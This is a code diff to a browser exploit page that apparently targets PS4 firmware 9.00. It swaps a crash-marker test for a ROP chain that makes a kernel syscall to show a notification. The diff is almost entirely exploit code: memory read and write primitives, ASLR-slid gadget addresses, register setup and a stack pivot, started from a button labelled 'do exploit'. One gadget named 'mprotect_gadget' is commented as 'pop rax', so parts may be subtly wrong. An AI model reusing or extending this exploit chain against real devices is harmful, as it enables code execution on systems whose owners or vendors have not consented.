@@ -394,42 +394,62 @@
                 let slid_jop2 = addToFloat64Bits(hexToFloat(jop2.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide));
                 log('[+] slid_jop2 @ 0x' + floatToHex(slid_jop2));
 
-                // PS4 9.00 Browser - Simple test payload
-                // Since browser is sandboxed, we can't access scePadSetLightBar
-                // Instead, let's just call alert() to prove code execution
+                // PS4 9.00 Browser - Notification Test
+                // Show a notification to prove ROP execution works
+                // sceKernelSendNotificationRequest is syscall 608
                 
-                log('[+] Building simple test ROP chain (alert box)...');
+                log('[+] Building notification ROP chain...');
                 
-                // JavaScript alert function address
-                let alert_func = addrof(alert);
-                log('[+] alert function @ 0x' + floatToHex(alert_func));
-                
-                // Build ROP chain to call alert("EXPLOIT SUCCESS!")
                 let rop_chain_base = addToFloat64Bits(container_addr, 0x200);
                 let rop_offset = 0;
                 
-                // Create the alert message string
-                let msg = "PS4 ROP EXECUTION SUCCESS!";
-                let msg_addr = get_view_vector(new TextEncoder().encode(msg + "\0"));
-                log('[+] Message at 0x' + floatToHex(msg_addr));
+                // Create notification message
+                let notif_buffer = new Uint8Array(0x400);
+                let msg = "PS4 EXPLOIT SUCCESS!";
+                for(let i = 0; i < msg.length; i++) {
+                    notif_buffer[i] = msg.charCodeAt(i);
+                }
+                let notif_addr = get_view_vector(notif_buffer);
+                log('[+] Notification buffer @ 0x' + floatToHex(notif_addr));
                 
-                // Simple ROP: just prove we can execute by triggering a crash with known value
-                // Write 0x4141414141414141 to a known location and let it crash
-                // You'll see 0x4141414141414141 in the crash dump
+                // Syscall 608: sceKernelSendNotificationRequest(0, buffer, size, 0)
                 
-                // pop rdi; ret
+                // pop rax; ret (syscall number)
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(mprotect_gadget.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
+                rop_offset += 8;
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(608)); // syscall 608
+                rop_offset += 8;
+                
+                // pop rdi; ret (arg1 = 0)
                 write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rdi.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
                 rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0x4141414141414141)); // marker value
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0));
                 rop_offset += 8;
                 
-                // Write marker to memory (this will crash but prove ROP works)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat('0x613b'.padStart(16, '0')), floatToDecimal(aslr_slide))); // mov qword ptr [rdi], rax; ret
+                // pop rsi; ret (arg2 = buffer address)
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rsi.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
+                rop_offset += 8;
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), notif_addr);
                 rop_offset += 8;
                 
-                log('[+] ROP chain built - ' + (rop_offset/8) + ' gadgets');
-                log('[+] Crash will show RDI = 0x4141414141414141');
-                log('[+] This proves ROP execution works!');
+                // pop rdx; ret (arg3 = size)
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rdx.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
+                rop_offset += 8;
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0x400));
+                rop_offset += 8;
+                
+                // pop rcx; ret (arg4 = 0)
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat('0x657b7'.padStart(16, '0')), floatToDecimal(aslr_slide))); // pop rcx
+                rop_offset += 8;
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0));
+                rop_offset += 8;
+                
+                // mov r10, rcx; syscall; ret
+                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(syscall_gadget.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
+                rop_offset += 8;
+                
+                log('[+] Notification ROP chain built - ' + (rop_offset/8) + ' gadgets');
+                log('[+] Should show: "PS4 EXPLOIT SUCCESS!"');
                 
                 // Pivot to ROP chain
                 write64(addToFloat64Bits(next_addr, 0x10), rop_chain_base);
@@ -445,7 +465,7 @@
     <body>
         <center>
             <br></br>
-            <button style="background:none; border: none; font-size: 100px; text-decoration: none; font-family: Helvetica" onclick="poc()">do exploit lmao</button>
+            <button style="background:none; border: none; font-size: 100px; text-decoration: none; font-family: Helvetica" onclick="poc()">do exploit</button>
 
             <br></br>
             <br></br>
